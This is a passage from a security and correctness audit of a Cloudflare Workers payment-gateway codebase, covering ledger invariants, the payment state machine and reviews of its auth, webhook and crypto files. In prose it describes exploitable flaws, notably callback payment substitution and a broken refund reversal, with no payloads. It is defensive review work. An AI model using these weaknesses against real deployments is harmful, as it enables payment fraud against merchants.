| `ASSETS` | Static assets, `run_worker_first: true` | index.ts:223 | asset 404 | None |
| `AI` | Workers AI | sms-parser fallback | **commented out in wrangler.jsonc** — the parser falls back to heuristic-only | Low |
| `ANALYTICS` | Analytics Engine | page()/metric() | **commented out** — all metrics are silent no-ops in default deploys (EDGE-P2-006) | Low (observability debt) |
| `JWT_SECRET`/`APP_KEY`/`ENCRYPTION_KEY` | secrets | jwt/crypto | JWT: `createJwtService` throws (fail closed). ENCRYPTION_KEY: `decrypt` catch-skip ⇒ **empty credentials silently** ⇒ adapters fail with "missing credentials" — fail closed by accident, but silently (EDGE-P2-009) | High |
| `CF_ACCESS_TEAM_DOMAIN`/`CF_ACCESS_AUD_TAG` | vars | access middleware | absent ⇒ admin falls through to **bearer auth** (still authenticated by `requireBearerApiAuth`) — acceptable; JWKS fetch failure ⇒ 503 **fail closed** | High |
| `BREAK_GLASS_CLIENT_ID/SECRET` | secret | access middleware | wrong ⇒ 401 + page; `===` compare not timing-safe (EDGE-P2-011) | Medium |
| Cron triggers | 3 schedules | scheduledHandler | miss ⇒ retry once; next window heals | Low |

**Verdict:** D1/DO/Workflows fail closed where it matters; KV-dependent controls (maintenance) and the Ratelimit bindings fail open by design; `ENABLED_GATEWAYS` unset enables **all** adapters (fail-open default, EDGE-P2-016). The `system:root_api_key` plaintext KV entry (bootstrap.ts:225) is a standing secret-exposure surface.


---

# 7. Payment State Machine Reconstruction

Derived from code + schema (not documentation). States are the CHECK-validated values in `migrations/0001_initial_schema.sql:252-258` (intents) and `:280-286` (transactions).

## 7.1 op_payment_intents states

`pending → processing → completed | failed | cancelled | expired`

## 7.2 op_transactions states (superset)

`pending, created, processing, callback_processing, completed, failed, cancelled, expired, refunded, disputed, awaiting_verification, pending_review`

## 7.3 Reconstructed transition table

| From | To | Trigger (file:line) | Guard | Ledger effect | External effect | Retry behavior |
|---|---|---|---|---|---|---|
| (none) | `pending` intent + `pending` tx | `createIntent` payment.ts:62-162 | amount non-zero (isZero); zod `^\d+(\.\d{1,2})?$` | none | none | Idempotent only if client sends `X-Idempotency-Key` **and** no concurrent race (EDGE-P1-001) |
| `pending` | `processing` | `initiatePayment` payment.ts:253-262 (D1 batch) | gateway belongs to merchant (`WHERE id=? AND merchant_id=?`); ENABLED_GATEWAYS for non-manual | none | adapter.initiate (gateway session) | Batch is atomic; re-initiate overwrites status unconditionally (no state guard) |
| `processing` | `awaiting_verification` | checkout submit-trx checkout.ts:234-241 | TrxID ≥ 4 chars, not previously completed on another intent (checkout.ts:149-163) | none | none | Metadata updated with customer_trx_id/phone |
| `awaiting_verification`/`pending`/`processing`/`created` | `completed` | (a) handleCallback payment.ts:314-315; (b) webhook webhooks.ts:210-213; (c) SMS consumer sms-consumer.ts:87-98; (d) checkout SMS match checkout.ts:205-209 | **ledger posting must succeed first** (payment.ts:379-386) | postPaymentLedgerEntry (idempotent `m{m}:payment:{intent}`) | merchant webhook enqueued | All three entry points converge; ledger dedup makes retries safe |
| `processing` | `failed` | handleCallback verify failure payment.ts:317-321 | **NO status guard** — can regress `completed`→`failed` (EDGE-P1-006) | none (if not yet posted) | none | none |
| `pending`/`processing` | `expired` | cron expirePendingIntents cron/handler.ts:112-130 | `expires_at < now` | none | none | Can race with completion (expiry at T, completion at T+ε → intent ends `completed`, tx `expired`/`completed` mismatch) |
| `completed` | `refunded` (tx) | **never written by any code path** — `op_refunds` rows are created, but `op_transactions.status` is never set to `refunded` | — | reversal intended (broken — EDGE-P0-002/003) | refund webhook | — |

## 7.4 Impossible / dangerous transitions observed

1. **`completed` → `failed`** — possible via a late, failing redirect callback (`payment.ts:317-321` UPDATE has no `WHERE status IN (...)`). Ledger remains posted; reporting shows failed. **Dangerous.**
2. **`completed` → `processing`** — possible by re-posting `/checkout/{token}/initiate` after completion (`payment.ts:255-261` no state guard). Ledger unaffected; state chaos.
3. **`expired` → `completed`** — expiry cron marks intent expired; a concurrent or late confirmation calls `completeTransaction`, which flips intent back to `completed` and posts the ledger (no expiry check anywhere in completion). Acceptable-ish (payment did happen) but unmodeled.
4. **`refunded` state is dead** — nothing ever writes it; refund bookkeeping lives solely in `op_refunds`.
5. **`callback_processing`, `pending_review`, `disputed`** — defined in the schema CHECK, never written by any code path. Dead states indicate schema/implementation drift.

**State machine verdict: CONDITIONAL.** Terminal-state protection is absent at every mutation site; the only real protection is the ledger's idempotency key (money) — nothing protects the *status fields* from illegal transitions.

---

# 8. Ledger Invariants & Posting Protocol Audit

This is the highest-priority review per the brief. Files read completely: `src/do/ledger-do.ts`, `src/services/ledger.ts`, `src/services/ledger-audit.ts`, `src/services/payment.ts`, `src/services/reconciliation.ts`, `migrations/0003_ledger_posting_protocol.sql`, `docs/POSTING-PROTOCOL.md`.

## 8.1 Invariant A — Double-entry balance

**Requirement:** Σdebits == Σcredits for every transaction; global trial balance zero.

**Implementation:** `validatePostingShape` (ledger-do.ts:529-562) rejects unbalanced payloads with `UNBALANCED`; amounts must be positive safe integers ≤ 9,000,000,000,000 minor units (90M major). `trialBalance()` (ledger-do.ts:275-327) aggregates in INTEGER minor units and additionally verifies each stored `accounts.balance_minor` equals the journal-derived balance per account. Every posting constructs balanced entries: payment = debit clearing `amount` / credit revenue `amount` (+ debit fee-expense `fee` / credit clearing `fee` when a fee exists) (ledger.ts:365-373); reversal = exact inverse (ledger.ts:151-155).

**Attack test:** an API caller cannot reach `postTransaction` directly — `LedgerService.buildPayload` constructs entries from D1 account rows and `moneyToMinorStrict` (regex `^-?\d+(\.\d{1,2})?$` + `Number.isSafeInteger`); negative or >2dp money throws before the DO is called; the DO re-validates shape independently. The only producers of payloads are `postPaymentLedgerEntry` (payment), `LedgerService.reverse` (refund/adjustment), and reconciliation replay (the stored canonical `payload_json`).

**Verdict: PASS.** Confirmed by `tests/ledger-do.test.ts` (14/14) and `ledger-consistency.test.ts`.

## 8.2 Invariant B — Exactly-once financial effect

**Requirement:** same logical operation submitted N times ⇒ one posting.

**Implementation:** dedup by `tx_id` (ledger-do.ts:150-160) against the DO's `posted_transactions` table, which is keyed `tx_id TEXT PRIMARY KEY`. The payment key is deterministic: `m{merchant}:payment:{paymentIntentId}` (ledger.ts:383). The reversal key is `m{merchant}:reversal:{original.uuid}` (ledger.ts:165). D1 `op_ledger_postings` (PK `tx_id`) plus `ON CONFLICT(tx_id) DO NOTHING` in `insertPendingPosting` (ledger-audit.ts:33-49) and the NOT-EXISTS entry guards in `writeLedgerAuditTrail` (ledger-audit.ts:101-129) make the D1 mirror replay-safe.

**Residual gaps:** (1) the mirror's NOT-EXISTS guard is keyed `(ledger_transaction_id, account_id, direction, amount)` — a legitimate posting containing two identical lines would have the second silently dropped from the mirror while the DO journal keeps both ⇒ mirror/DO divergence ⇒ false drift pages (EDGE-P2-008). Current entry constructors never emit identical duplicate lines, so this is latent. (2) Reconciliation's replay path trusts `payload_json` verbatim — a payload whose accounts were since renamed would post to UNKNOWN_ACCOUNT and be quarantined as rejected (fail-closed, good).

**Verdict: PASS (payments), PASS (reversal mechanics), FAIL (refund semantics — see §8.4 and EDGE-P0-002/003).**

## 8.3 Invariant C — No negative balance where prohibited

**Requirement:** balance ≥ 0 on each account's normal side; two concurrent withdrawals must not both succeed.

**Implementation:** `checkBalances` (ledger-do.ts:401-439) reads current balances, computes signed deltas, and throws `INSUFFICIENT_FUNDS` **before any write**; the entire posting (including both D1 hops) runs inside `ctx.blockConcurrencyWhile` (ledger-do.ts:113), which is the DO input gate — the documented single-writer serialization. The v0.2.0 "balance check commented out" bug is definitively fixed and property-tested.

**Concurrency test (reasoned):** `withdraw(A,80) || withdraw(A,80), balance=100` — the second caller's `postTransaction` cannot start until the first completes (input gate), at which point its balance check reads 20 and throws. **Exactly one succeeds.** `refund(X) || refund(X)` — second hits tx_id dedup. `complete(X) || complete(X)` — same.

**Residual gap:** `checkBalances` casts account type via `isDebitNormal(acct.type as 'asset')` — the DO's own CHECK constraint guarantees type ∈ the five valid values, so the cast is safe.

**Verdict: PASS.**

## 8.4 Invariant D — Ledger before payment completion

**Requirement:** no payment may become COMPLETED before its ledger effect is durably committed.

**Payments:** `completeTransaction` awaits `postPaymentLedgerEntry` (payment.ts:379-386) and only then runs the atomic batch flipping transaction+intent to `completed` (payment.ts:389-399). If the posting fails, the caller errors and nothing is marked completed. If the process dies between posting and the batch, the D1 pending row + reconciliation heal the ledger, and any retry re-runs completion idempotently. **PASS** (with the operational caveat that the *payment row itself* is never healed by reconciliation — see EDGE-P1-006).

**Refunds:** `finalizeRefund` (refund-reconciliation.ts:169-221) does attempt reversal before marking the refund completed — ordering is right — but the reversal itself is broken:
- `ledger.reverse(refund.transaction_id, …)` passes an **`op_transactions.id`** into a function that expects an **`op_ledger_transactions.id`** (ledger.ts:122-136 selects `FROM op_ledger_transactions WHERE id = ?`). These are independent AUTOINCREMENT sequences over different tables.
- When the numeric id happens to exist in `op_ledger_transactions`, the workflow **reverses the wrong transaction** (full inverse of an unrelated posting).
- When it does not exist, `reverse()` throws `'Ledger transaction not found or already reversed'` — and `finalizeRefund`'s catch treats any error whose string **contains `'already reversed'`** as success (refund-reconciliation.ts:185-187). The not-found case therefore **silently skips the reversal** and marks the refund completed.
- Partial refunds are unsupported: the reversal posts the inverse of whatever ledger row it loaded (full amount), while `op_refunds.amount` may be a fraction; and multiple refunds against one payment each try `reverse()` on the same id.

**Verdict: PASS for payments. FAIL for refunds — this is the single worst correctness bug in the repository.**

## 8.5 Invariant E — Immutable financial history

`rg "UPDATE ledger|DELETE FROM ledger"` across src+migrations: no code path UPDATEs or DELETEs `op_ledger_entries`, `op_ledger_transactions` rows other than the status flip `posted → reversed` (ledger.ts:169-172) and the postings row's status/attempts/error columns (protocol bookkeeping). Reversals use compensating entries. The DO journal has no UPDATE/DELETE paths at all. **PASS**, with the note that `op_ledger_transactions.status` is mutable by design (posted→reversed) and `op_ledger_postings.error/attempts` are mutable bookkeeping columns — both acceptable.

## 8.6 Posting-protocol failure matrix (crash at every boundary)

The DO protocol (A→F) with each failure injected (the repo's own test seam `__testInjectFault` covers three of these; the rest are reasoned from the code):

| Crash point | State left behind | Money duplicated? | Money lost? | Stuck? | Recovery path |
|---|---|---|---|---|---|
| Before anything (request lost) | nothing | No | No | No | client retry |
| After A/B/C (validation rejected) | nothing (structured failure, no writes) | No | No | No | caller sees error |
| After D (pending row written), before E | `op_ledger_postings.status='pending'`, no journal | No | No | **Yes until replay** | hourly `reconcilePendingPostings` replays; DO posts (dedup miss ⇒ fresh post) ⇒ posted |
| After E (DO journal+balances committed), before F | DO committed; pending row still 'pending' | No (dedup on replay) | No | ledger committed, D1 mirror missing | replay hits `duplicate` ⇒ `writeLedgerAuditTrail` heal path (reconciliation.ts:124-129) |
| After F, before response | fully posted | No | No | payment row may still be non-completed (caller saw error) | retry of completion: ledger dedup + idempotent UPDATEs converge; **but the payment row is only healed if some actor retries — reconciliation does NOT flip payment status** (EDGE-P1-006) |
| Worker dies between completeTransaction step 2 (D1 completed) and step 3 (webhook dispatch) | payment completed; merchant never notified | No | No | **notification lost forever** (no outbox — EDGE-P2-007) |
| DO input gate broken (throw inside blockConcurrencyWhile) | tenant ledger fails until eviction | No | No | **tenant-wide posting outage** | `postTransaction` never throws by design (structured results); the remaining risk is a runtime-level fault (e.g. storage corruption) |

**Trial-balance / cross-tenant checks:** `verifyAllMerchants` (reconciliation.ts:163-186) runs the DO-vs-D1-mirror comparison per active merchant and **pages on drift** — genuinely good. Two blind spots: it excludes `is_platform=1` merchants (`WHERE status='active' AND is_platform=0` — the platform merchant created by bootstrap is never verified — EDGE-P2-003), and the mirror can false-drift via EDGE-P2-008.

## 8.7 Serialization boundary summary

| Operation | Serialization mechanism | Sufficient? |
|---|---|---|
| Ledger posting | DO input gate (`blockConcurrencyWhile`) around the whole A–F closure, incl. both D1 hops | **Yes** — the strongest guarantee in the codebase |
| Idempotency record | D1 `UNIQUE(merchant_id,key)` + post-hoc `waitUntil` insert | **No** — concurrent duplicates both execute (EDGE-P1-001) |
| createIntent (intent+tx rows) | none (two sequential `run()`) | **No** — crash between inserts orphans an intent (EDGE-P1-007) |
| Status flips (completed/failed/processing) | none (bare UPDATE by id) | **No** — last-writer-wins regression (EDGE-P1-006) |
| Refund creation | none | No (double-refund possible under concurrency; ledger reversal idempotent by luck of key) |
| Webhook event dedup | D1 `UNIQUE(merchant_id,gateway,event_id)` insert (before processing) | Partially — the unique constraint holds, but a random fallback event_id defeats it logically (EDGE-P1-003) |

---

# 9. P0 File Deep Reviews

The seven files the briefs mandate for the deepest manual review. Each follows the required template: primary responsibility, threats, existing protections, critical invariants, failure modes, concurrency concerns, tenant isolation, relevant tests, missing tests, verdict.

## 9.1 `src/index.ts` (295 lines)

**Primary responsibility:** Worker entry; composes the middleware stack; mounts routes; exports DO/Workflow classes; dispatches queue consumers and cron.

**Threats:** middleware-ordering bypasses; asset shadowing of API routes; host-header tenant confusion; CORS misconfig; unthrottled public surfaces; exception leakage.

**Existing protections:** `run_worker_first: true` + explicit `/assets/*` delegation (index.ts:223-225) means assets can never shadow API routes (verified: the Worker sees every path first); `requestId` precedes `logger`; CORS origin allowlist is fail-closed (`allowed.includes(origin) ? origin : ''`, credentials:false — index.ts:136-149); Access gate before admin routes; install limiter mounted before `installRoutes`; `onError` hides internals in production (error.ts:142-155); the queue handler **awaits** `process()` so ack/retry rejections propagate to the runtime's retry/DLQ machinery (index.ts:252-273, comment is correct).

**Critical invariants:** every route passes domain → auth before mutation; public routes are enumerable (health, checkout, webhook, install, assets, api-reference).

**Failure modes / weaknesses:** (1) `securityHeadersMiddleware` (nonce CSP) is mounted **only** on `/api/*` and `/webhook/*` (index.ts:160-161) — the checkout HTML (the only script-bearing surface!) has **no CSP** beyond the builtin's DENY framing (EDGE-P0-006). (2) `csrfMiddleware` is imported nowhere — dead code (EDGE-P2-001). (3) The bootstrap-check middleware (index.ts:83-108) fires `ensureSystemBootstrapped` via `waitUntil` on any request when the KV flag is missing — combined with bootstrap defaults this is the auto-arm of EDGE-P0-005; concurrent cold starts can double-run it (idempotent-ish per item, but two platform merchants are possible under a race on a fresh D1). (4) No rate limit on `/checkout/*`, `/webhook/*`, `/api/mobile/v1/*` (native edge rules are "recommended in dashboard comments" only — not enforced by this repo).

**Concurrency concerns:** the deduplicated `bootstrapPromise` is per-isolate, not global — two PoPs can run bootstrap concurrently (guarded only by per-item existence checks; the platform-merchant insert is not race-safe).

**Tenant isolation:** delegated to domainMiddleware + auth; the master domain intentionally has no tenant context.

**Relevant tests:** `smoke.test.ts` (boot/404/CORS-preflight), `api-middleware.test.ts`.

**Missing tests:** no test asserts CSP headers on `/checkout/*`; no test asserts the middleware order (e.g. that domain 403 precedes auth 401 for a mismatched host).

**Verdict: CONDITIONAL** — composition is sound; HTML-surface CSP absence and dead CSRF middleware are the gaps.

## 9.2 `src/services/payment.ts` (417 lines)

**Primary responsibility:** payment orchestration — createIntent, initiate, callback verify, completion (ledger-first).

**Threats:** amount tampering; intent/gateway substitution; status regression; atomicity gaps; duplicate completion.

**Existing protections:** ledger-first completion ordering (379-386); deterministic idempotency key `m{merchant}:payment:{intentId}`; gateway lookup constrained to `merchant_id` (193, 80-81); zod-validated API input (validation.ts); `assertGatewayEnabled` for non-manual gateways (198-200); ledger posting awaited (not fire-and-forget).

**Critical invariants:** (I1) completion amount must equal the locally stored `tx.amount`; (I2) the gateway confirmation must belong to THIS intent; (I3) completion must be idempotent.

**Failure modes / weaknesses:**
- **I1 violated (EDGE-P0-004):** `handleCallback` (271-324) calls `adapter.verify(callbackData, credentials)` and, on success, calls `completeTransaction(intent.trx_db_id, intent.id, verifyResult.gateway_trx_id)` — `verifyResult.amount` is **discarded**, and `verifyResult.trx_id` (the merchant order reference the gateway echoes, e.g. SSLCommerz `tran_id`) is **never compared to `intent.trx_id`**. The customer controls `callbackData` (query params on the redirect URL). For bKash, the `paymentID` executed is whatever the caller supplies — an attacker completes their own small payment and attributes it to any intent whose checkout token they hold. For SSLCommerz, any valid `val_id` from the same store works.
- **Status regression (EDGE-P1-006):** failure path (317-321) `UPDATE op_transactions SET status='failed' WHERE id=?` with no `AND status IN ('pending','processing')` — a late failing callback after completion flips the row to `failed` while the ledger stays posted. Same for the processing batch (253-262).
- **Atomicity (EDGE-P1-007):** `createIntent` performs two sequential `run()`s (108-125, 140-155) — a crash between them leaves an intent with no transaction; the prior audit's claim that this was batched is false today. The auto-seed of a 'manual' gateway (95-104) races under concurrent first-payments (no UNIQUE(merchant_id,slug)).
- **Credential load joins:** `handleCallback`'s credential query (298-303) joins `op_payment_intents` but not the merchant — same gateway_id reused across merchants is scoped by `pi.gateway_id` only; benign but sloppy (the initiate path scopes correctly).

**Concurrency concerns:** completion is safe (DO dedup); initiate/status flips are not guarded; createIntent is not atomic.

**Tenant isolation:** all queries merchant-scoped or reached via merchant-scoped lookups. Webhook/SMS completion lookups include `merchant_id` (webhooks.ts:206, loadOpenOrders sms-consumer.ts:129-133).

**Relevant tests:** `payment-integrity.test.ts` (7/7 — paired rows, idempotent completion), `payment-edgecases.test.ts` (4/4).

**Missing tests:** amount-mismatch on callback (should refuse completion when verifyResult.amount ≠ tx.amount); paymentID substitution across intents; late-failing callback after completion; crash between the two createIntent inserts.

**Verdict: FAIL** — the callback path violates the two core completion invariants despite a well-designed ledger sink.

## 9.3 `src/do/ledger-do.ts` (564 lines)

**Primary responsibility:** the per-merchant ledger: single-writer posting (A–F), balances, trial balance, snapshots, alarm.

**Threats:** double-post, negative balance, unbalanced entries, input-gate breakage, cross-tenant posting, test-seam abuse.

**Existing protections:** `blockConcurrencyWhile` around the entire posting including D1 hops; `validatePostingShape` (Σdebits=Σcredits, positive safe integers, ≤ 90M); tx_id dedup; balance guard before any write; `REJECTED_TX_ID` poison guard for reconciliation-quarantined ids; constructor-time table bootstrap inside the input gate; journal CHECK constraints (`direction IN ('debit','credit')`, `amount_minor > 0`); structured failures (never throws across the gate — empirically documented and tested).

**Critical invariants:** exactly-once per tx_id; balance ≥ 0; balanced journal; single currency per DO (CURRENCY_MISMATCH guard at 418-422).

**Failure modes / weaknesses:**
- **Test seam reachability (EDGE-P2-002 sibling):** `__testInjectFault` (378-387) throws only when `ENVIRONMENT === 'production' && ALLOWED_ORIGINS !== 'https://allowed.example'` — i.e. a production deployment that happens to set `ALLOWED_ORIGINS` to the test value (documented in vitest.config.ts as THE test value) has fault injection enabled. The guard fails open on a magic env combination. Reachable only from in-Worker code (DO stubs are not HTTP-exposed), so impact is limited to a compromised worker or buggy caller — defense-in-depth failure (EDGE-P2-002).
- **No tenant self-verification:** the DO derives its identity from the DO name (`merchant-{id}`) but never asserts `payload.merchant_id === self id` — a misbehaving caller could write merchant X's rows into merchant Y's book while the D1 pending row records X. Defense-in-depth gap (EDGE-P2-012).
- `seedChart` currency is whatever the first posting carries; a later different-currency posting is rejected — documented, acceptable single-currency design.
- `snapshotBalances` derives merchantId from `this.ctx.id.name` — robust to odd names (skips D1 write).

**Concurrency concerns:** none remaining — the input gate is the serialization boundary and is used correctly for the whole critical section.

**Tenant isolation:** one DO per merchant by construction; the only residual risk is the missing self-check above.

**Relevant tests:** `ledger-do.test.ts` 14/14 including fault injection at D/E/F and convergence; `ledger-consistency.test.ts` 11/11.

**Missing tests:** fault-seam rejection in production-mode env; cross-merchant payload rejection (once implemented).

**Verdict: PASS** — the best-engineered file in the repository; its invariants are real, tested, and re-verified here.

## 9.4 `src/middleware/auth.ts` (182 lines)

**Primary responsibility:** bearer API-key auth (merchant REST + admin) and mobile JWT auth; scope enforcement.

**Threats:** key forgery, timing attacks, tenant confusion, scope escalation, path-based auth bypass.

**Existing protections:** key format regex `^op_live_([a-z0-9]{12})_([a-z0-9]+)$` (44); prefix index lookup + full-hash timing-safe compare (`timingSafeEqual`, 88 — implementation verified constant-time over max-length with length-diff folded in, crypto.ts:277-291); merchant-status and key-expiry checks (74-79); scope check before `next()` (92-97); **tenant mismatch 403** when the domain-resolved merchant differs from the key's merchant (104-108) and for JWTs (160-164); `last_used_at` updated fire-and-forget; JWT path delegates to jose with pinned `algorithms:['HS256']`, issuer, audience, and type discrimination (jwt.ts:95-111).

**Failure modes / weaknesses:**
- **Prefix lookup is not collision-safe:** `WHERE key_prefix=? … LIMIT 1` without ORDER BY and without a UNIQUE constraint on `key_prefix` (schema has only an index). Two keys sharing a 12-char prefix → one of them randomly fails auth. Probability low (36^12) but nonzero and silent (EDGE-P2-013).
- **Path-based JWT exemptions:** `requireJwtAuth` exempts any path ending `/pair`, `/devices`, `/refresh`, `/devices/token-refreshes` (129-135). These are exactly the unauthenticated endpoints — correct today, but the pattern is fragile: any future route accidentally ending in these suffixes (e.g. `…/v2/devices`) is silently unauthenticated.
- **Scope model gaps live in route mounts, not here:** `requireBearerApiAuth(['read','write','admin'])` on `/api/v1` means a **read-only key can POST /payments** (api.ts:24 with no `requireScope('write')` on that route) and can register/test/delete webhooks (EDGE-P1-008).
- The two-step lookup (prefix row, then hash by id) is two D1 round-trips per request — perf note only.

**Tenant isolation:** enforced (the prior audit's P0-3 fix is present and correct).

**Relevant tests:** `api-middleware.test.ts`, `jwt.test.ts`, `access-jwt.test.ts` (all pass). The tenant-mismatch JWT test exists but **cannot run** (suite crash — EDGE-P1-009).

**Missing tests:** prefix-collision behavior; read-scope key attempting POST /payments (expected 403 after fix).

**Verdict: CONDITIONAL** — the auth core is solid; scope wiring at route level and the JWT test regression are the gaps.

## 9.5 `src/middleware/cloudflare-access.ts` (434 lines)

**Primary responsibility:** the only gate for `/api/admin/*`: Cloudflare Access JWT verification (JWKS), op_live admin-key fast path, break-glass service token.

**Threats:** header spoofing (the v0.2.0 backdoor), alg confusion, JWKS outage, kid rotation, break-glass abuse, missing-config fail-open.

**Existing protections:** verified-JWT-only policy with `Cf-Access-Jwt-Assertion`; ES256/RS256 allowlist (175) — `none` and HS256 are rejected; iss normalization, aud membership, exp with 60s skew (178-184); kid-based key selection with exact-match narrowing (187-195); JWKS 5-minute module cache with one forced refresh on verification failure (394-401); **JWKS failure ⇒ 503 fail-closed** (402-408); spoofed `Cf-Access-Authenticated-Email` mismatch is logged/paged, never trusted (419-427); break-glass is the only non-JWT path, pages on use, and denies invalid attempts (335-364).

**Failure modes / weaknesses:**
- **Bearer fast-path fall-through (284-329):** an invalid `op_live_…` key does **not** 401 here — it falls through to the team-domain branch. When `CF_ACCESS_TEAM_DOMAIN`/`CF_ACCESS_AUD_TAG` are unconfigured, the middleware passes any request carrying `Authorization: Bearer <anything>` to the router (367-381) relying on `adminApiRoutes.use('*', requireBearerApiAuth(['admin']))` to actually authenticate. That second layer exists (admin-api.ts:29), so there is **no bypass today** — but the design means the *only* real gate is the bearer middleware, and Access-unconfigured deployments rely entirely on it. Confidence: Confirmed (code trace). Severity: P2 (single-layer, documented intent, no exploit).
- **Break-glass compare is `===`** (338-342) — not timing-safe (EDGE-P2-011).
- **JWKS fetch has no timeout** (254) — a hanging fetch stalls every admin request (Workers fetch has no default deadline).
- The ES256 dual-encoding retry (raw r||s and DER) is sound JOSE practice; the `verify` loop tries all candidate keys — acceptable.
- No `nbf` check (Access JWTs carry `iat`; `exp` suffices in practice).

**Tenant isolation:** the admin-key fast path pins `merchantId` to the key's merchant (318-323); Access identities are not merchant-scoped (platform-level admin by design).

**Relevant tests:** `access-jwt.test.ts` (all pass — alg pinning, iss/aud/exp, unknown kid, break-glass denial).

**Missing tests:** Access-unconfigured + invalid bearer (expected 401 from the inner layer); JWKS hang behavior.

**Verdict: CONDITIONAL** — fail-closed where it matters; the fall-through and un-timed JWKS fetch are hardening gaps.

## 9.6 `src/controllers/webhooks.ts` (245 lines)

**Primary responsibility:** inbound gateway webhooks `/webhook/{slug}`: gateway allowlist, IP/geo layers, signature verification, event dedup, payment completion.

**Threats:** forged webhooks, replay, oversized bodies, merchant confusion, completion of wrong payment, info leak.

**Existing protections:** unknown/disabled gateway ⇒ uniform 404 (63-64); per-gateway data-driven IP allowlist with 60s cache (43-54, 100-108); geo fallback BD/AF/SG/US (109-115); **signature verification always required** via `adapter.verifyWebhook` (136) — 76 generated adapters return false (fail-closed), Stripe verifies HMAC over the raw body, PayPal verifies via API; raw-body-based verification (131 — the body passed to adapters is the raw text, never a reserialized JSON); event dedup by `UNIQUE(merchant_id,gateway,event_id)` checked before processing (160-171); completion transaction looked up with `AND merchant_id = ?` (206); amounts come from the DB row, never the webhook (completeTransaction uses `tx.amount`); failed signature attempts are recorded in `op_webhook_deliveries` (139-145).

**Failure modes / weaknesses (EDGE-P1-003, EDGE-P2-004/014/015):**
- **No body-size limit** — `await c.req.text()` (131) is unbounded; the prior audit's claimed `MAX_WEBHOOK_BYTES=1MiB` does not exist in this file. Signature verification hashes arbitrary-length bodies ⇒ CPU burn; successful verification persists `rawBody` into `op_webhook_events.payload` unbounded.
- **Random event_id fallback** (159): `payload.id ?? payload.event_id ?? crypto.randomUUID()` — gateways that omit ids get a fresh UUID per delivery ⇒ dedup never fires ⇒ full reprocessing each redelivery (money safe via ledger dedup; outbound merchant webhook re-dispatched each time).
- **Geo layer fail-open on missing `cf`** (109): `else if (c.req.raw.cf?.country)` — when the `cf` object is absent (non-CF ingress in dev/tests), the geo check is skipped entirely. The prior audit's claimed fail-closed fix (`if (!country || …) 403`) is absent.
- **Merchant resolution on master domain** (70-84): `ORDER BY m.is_platform DESC, g.id ASC LIMIT 1` — when two merchants configure the same gateway slug, inbound webhooks on the master domain bind to the **platform merchant's** config; legitimate events for other merchants then fail the tx lookup (`merchant_id` mismatch) and are dropped silently (return 200 "processed" with no completion!) — an availability bug that *looks* successful (EDGE-P2-004).
- **Completion criteria** (201): `event_type.includes('payment') && (succeeded|completed|captured)` + `extractTransactionId` — only Stripe/PayPal/Razorpay extract ids; other gateways never complete via webhook (manual/SMS flow instead). Correct-by-omission.

**Concurrency concerns:** the event-insert-then-process pattern has a TOCTOU window (two concurrent same-event deliveries both pass the SELECT, one INSERT wins, loser 500s on UNIQUE) — benign ( UNIQUE rejects the second, which returns an error envelope; the client retries and gets `duplicate`).

**Tenant isolation:** merchant from domain or resolved; tx lookup merchant-scoped; credentials loaded per (gateway,merchant).

**Relevant tests:** none of the repo's tests exercise `/webhook/{slug}` end-to-end (gap).

**Missing tests:** oversized body 413; replay with id-less payload; geo-missing ingress; wrong-merchant webhook on master domain.

**Verdict: FAIL** — signature verification is real, but the size cap, deterministic dedup, and fail-closed geo claimed by the prior audit are all absent.

## 9.7 `src/lib/crypto.ts` (354 lines)

**Primary responsibility:** AES-256-GCM envelope encryption (gateway credentials/PII), HMAC-SHA256, PBKDF2 password hashing, SHA-256, randomness, timing-safe compare, CIDR matching.

**Threats:** nonce reuse, key misuse, timing leaks, weak password hashing, CIDR bypass.

**Existing protections:** AES-256-GCM with fresh 12-byte IV per encryption (`getRandomValues`, 69), 128-bit tag, base64(iv‖ct‖tag) envelope identical to the PHP original; HMAC-SHA256 over UTF-8 bytes; `timingSafeEqual` (277-291) folds length differences into the diff and scans max length — genuinely constant-time; `verifyPassword` compares hex digests of equal length via `timingSafeEqual`; API-key hashing uses SHA-256 (preimage-resistant; the key carries 128+ bits of entropy from UUID slices — brute force infeasible); CIDR matcher is IPv4-only and **denies IPv6** (344) — conservative.

**Failure modes / weaknesses:**
- **PBKDF2 default is 50,000 iterations** (28) while the header comment claims "600,000 iterations (OWASP 2023)". The default is 12× weaker than documented; `PBKDF2_ITERATIONS` env can legally drop it to 10,000 (min, 29). Free-tier deployments are nudged toward the floor. Passwords protected: install admin + bootstrap admin (EDGE-P2-017).
- **Single, versionless ENCRYPTION_KEY:** no `key_id`/version in the envelope — rotation is impossible without breaking every stored credential, and one key compromise exposes all merchants' credentials (EDGE-P2-010). The brief's recommended `key_id‖nonce‖ct‖tag‖version` envelope is absent.
- **`secretToBytes` heuristic** (131-141): a raw secret that happens to match base64 charset + length%4==0 is silently decoded — a compatibility footgun for raw-string gateway secrets (sign/verify both use the same function, so internal consistency holds; only provider-interop breaks) (EDGE-P3-008).
- **`decrypt` failure is swallowed by every caller** (`catch { /* skip */ }` in payment.ts, webhooks.ts, api.ts, refund.ts, refund-reconciliation.ts) — a wrong/rotated ENCRYPTION_KEY manifests as empty credential maps and adapter errors, not as a loud "key mismatch" alarm (EDGE-P2-009).
- MD5 lives in `lib/hash.ts` as a pure-TS RFC-1321 implementation used **only** by Rocket/PortWallet/Payfast provider signature schemes — never for passwords, API keys, or internal integrity. Verified by tracing all `md5Hex` call sites. Provider-compatibility exception, correctly isolated.

**Concurrency:** stateless; the module-level JWKS cache in cloudflare-access.ts (not crypto.ts) is the only shared mutable state.

**Tenant isolation:** encryption is platform-key, not per-tenant — by design, noted in EDGE-P2-010.

**Relevant tests:** `jwt.test.ts`, `money.test.ts`, gateway-integrity tests pin md5 vectors; no dedicated crypto envelope test for IV uniqueness at scale (statistical).

**Missing tests:** PBKDF2 iteration bounds (min/max rejection); decrypt-with-wrong-key surfaces a typed error; envelope version field once added.

**Verdict: CONDITIONAL** — primitives are correct and used correctly; key-management posture (versionless single key, weak-ish PBKDF2 default, silent decrypt failures) is the gap.


---

# 10. Findings — P0 Critical

> Format per the briefs' §38 / "FINDING CONFIDENCE" requirements. Severity uses the P0–P3 + INFO model; confidence uses Confirmed / Highly likely / Needs runtime validation / Theoretical. Secrets are redacted.

---

## EDGE-P0-001 — Live production API key and JWT signing secret committed to the repository

**Severity:** P0 — Critical
**Confidence:** Confirmed (files read; values verified structurally: `op_live_<12>_<32>` format and a 64-hex JWT secret; target host matches `wrangler.jsonc` `APP_URL`)
**Category:** Secret management / supply chain
